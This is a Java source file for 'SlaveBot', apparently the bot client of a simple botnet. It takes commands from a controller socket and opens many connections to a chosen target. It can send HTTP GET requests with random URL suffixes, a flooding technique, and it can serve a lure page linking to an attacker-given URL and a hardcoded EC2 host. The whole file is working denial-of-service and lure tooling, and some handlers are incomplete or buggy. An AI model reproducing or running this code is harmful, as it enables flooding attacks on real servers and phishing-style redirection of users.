import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.io.PrintWriter;
import java.io.*;


import java.net.UnknownHostException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Random;
import java.net.ServerSocket;
import java.util.Scanner;

class ClientConnections 
{
	String SlaveAddress;
	String SlaveName;
	int SlavePort;
	Socket SlaveSocket;
	String HostAddress;
	String HostName;
	int HostPort;
	Socket HostSocket;
	String date;
}
public class SlaveBot 
{


	public static ArrayList<ClientConnections> TargetList;
	static String TargetName;
	static int TargetPort;
	static int Number_ofconn;
	static Socket hostComm;
	static String CMD5;
	static String[] CMD ;

	public static String createRandomCode(int codeLength, String id){   
		char[] chars = id.toCharArray();
		StringBuilder sb = new StringBuilder();
		Random random = new SecureRandom();
		for (int i = 0; i < codeLength; i++) {
			char c = chars[random.nextInt(chars.length)];
			sb.append(c);
		}
		String output = sb.toString();
		return output ;
	} 

	public static void main(String[] args) throws UnknownHostException, IOException, InterruptedException 
	{
		String Local_host = null;
		int Port_number=0;
		Socket server_comm = null;
		String Client_input = null;

		if(args.length>4 || args.length<3)
		{
			System.out.println("Incorrect Slave Command");		
			System.out.println("Usage: SlaveBot -h [Ip address | hostname] -p [port_number]");


		}
		else if (args.length==4)
		{
			if(args[0].equals("-h") && args[2].equals("-p"))
			{
				Local_host=args[1];
				Port_number=Integer.parseInt(args[3]);
			}
			else
			{
				System.out.println("Input is invalid use -h and -p option for the command");
				System.exit(0);
			}
			try
			{
				//System.out.println(Local_host);
				//System.out.println(Port_number);
				server_comm = new Socket(Local_host,Port_number);
			}
			catch(Exception e)
			{
				System.out.println("Exception");
				System.out.println(e.getStackTrace().toString());
			}	
			while(true)
			{
				Scanner sc=new Scanner(server_comm.getInputStream());
				Client_input = sc.nextLine();
				CMD = Client_input.split(" ");
				System.out.println(CMD[0]);
				if(CMD[0].equals("connect"))
				{
					if (CMD.length < 4) 
					{
						System.out.println("Incorrect connect command");
					} 
					else
					{
						TargetName=CMD[1];
						TargetPort=Integer.parseInt(CMD[2]);
						Number_ofconn=Integer.parseInt(CMD[3]);
						//System.out.println(CMD.length);
						if(CMD.length>4){
							CMD5=CMD[4];
						}

						TargetList=new ArrayList<ClientConnections>();
						for(int i=0; i<Number_ofconn; i++)
						{
							try
							{
								ClientConnections cli_conn = new ClientConnections();
								hostComm=new Socket(TargetName,TargetPort);
								if(CMD.length==5)
								{	
									if(CMD5.equalsIgnoreCase("keepalive"))
									{
										System.out.println("keepalive enabled");  
										hostComm.setKeepAlive(true);
									}
									else if ((CMD5.matches("^url=[^ ]+$"))||(CMD5.matches("^url="))) 
									{
										String URL = CMD5.substring(4);
										String randomCode = createRandomCode(10, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
										String Final_URL = URL + randomCode ;
										BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(hostComm.getOutputStream(), "UTF8"));
										System.out.println("Random String Generated: " + Final_URL);
										System.out.println("");

										writer.write("GET " + Final_URL + "\r\n");
										writer.write("\r\n");
										writer.flush();
										BufferedReader reader = new BufferedReader(new InputStreamReader(hostComm.getInputStream()));
										String responseLine;
										if((responseLine = reader.readLine()) != null)
										{
											System.out.println("Respone received : " + responseLine);
											System.out.println("" );

										}
										//System.out.println("Connected Via: " + hostComm.getInetAddress().getLocalHost()+ ":" + hostComm.getLocalPort());
									}

									else
									{
									 cli_conn = new ClientConnections();
									hostComm=new Socket(TargetName,TargetPort);
									}
								}
								cli_conn.HostSocket = hostComm;
								cli_conn.HostAddress=hostComm.getInetAddress().getHostAddress();
								cli_conn.HostName=hostComm.getInetAddress().getHostName();
								cli_conn.HostPort = TargetPort;
								TargetList.add(cli_conn);
							}
							catch(IOException e)
							{
								//System.out.println("Exception another");
								//System.out.println(e.getStackTrace().toString());
							}
						}
					}
				}
				else if (CMD[0].equals("rise-fake-url")) {
					System.out.println("This is slave ");
					if (CMD.length < 3) {
					System.out.println("Incorrect rise-fake-url command");
					System.out.println("Usage: rise-fake-url port_number url");
				}
				else{
					TargetPort=Integer.parseInt(CMD[1]);

				while(true){


				ServerSocket serverSocket = null;
       try {
             serverSocket = new ServerSocket(TargetPort); 
           } catch (IOException e) 
           {
             System.err.println("Could not listen on port: "+TargetPort);
             //System.exit(1);
       }

       Socket clientSocket = null; 
       try {
            clientSocket = serverSocket.accept();

            if(clientSocket != null)                
                System.out.println("Connected");

       } catch (IOException e) {
             System.err.println("Accept failed.");
             System.exit(1);
      }

     PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);


    out.println("HTTP/1.1 200 OK");
    out.println("Content-Type: text/html");
    out.println("\r\n");
    out.println( "<li> <a href ="+"http://"+CMD[2]+">Check This Out</a></li>");
    out.println( "<li> <a href ="+"http://ec2-18-217-30-154.us-east-2.compute.amazonaws.com/>Check This Out</a></li>");
    out.flush();
   // response.sendRedirect("http://www.google.com");
    out.close();

    clientSocket.close();
    serverSocket.close();	

			}
				}
				
			}

			else if (CMD[0].equals("down-fake-url")) {
				if (CMD.length < 3) {
					System.out.println("Incorrect down-fake-url command");
					System.out.println("Usage: down-fake-url port_number url");
				}
				else{
						TargetPort=Integer.parseInt(CMD[2]);
				}

			}
				else if (CMD[0].equals("disconnect"))
				{
					if (CMD.length < 3) 
					{
						System.out.println("Incorrect disconnect command");
					}
					else
					{
						Iterator<ClientConnections> iterate = TargetList.iterator();
						int targetport=0;
						targetport = Integer.parseInt(CMD[2]);
						if (CMD[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true)
						{
							int found = 0;
							if(targetport==0)
							{
								for(int i=0; i<TargetList.size();i++ )
								{
									if(TargetList.get(i).HostAddress.equals(CMD[1]))
									{
										TargetList.get(i).HostSocket.close();
										TargetList.remove(i);
										found=1;
									}
								}				
							}
							else
							{
								for(int i=0; i<TargetList.size();i++ )
								{
									if(TargetList.get(i).HostAddress.equals(CMD[1])&&TargetList.get(i).HostPort==targetport)
									{
										TargetList.get(i).HostSocket.close();
										TargetList.remove(i);
										found=1;
									}
								}
							}
							if(found == 0)
							{
								System.out.println("Incorrect host address or port in disconnect!!");
							}
						}
						else
						{
							int found = 0;
							if(targetport==0)
							{
								for(int i=0; i<TargetList.size();i++ )
								{
									if(TargetList.get(i).HostName.equals(CMD[1]))
									{
										TargetList.get(i).HostSocket.close();
										TargetList.remove(i);
										found=1;
									}
								}
							}
							else
							{
								for(int i=0; i<TargetList.size();i++ )
								{
									if(TargetList.get(i).HostName.equals(CMD[1]) && TargetList.get(i).HostPort==targetport)
									{
										TargetList.get(i).HostSocket.close();
										TargetList.remove(i);
										found=1;
									}
								}					
							}
							if(found == 0)
							{
								System.out.println("Incorrect host address or port in disconnect!!");
							}
						}
					}
				}
			}	
		}
	}
}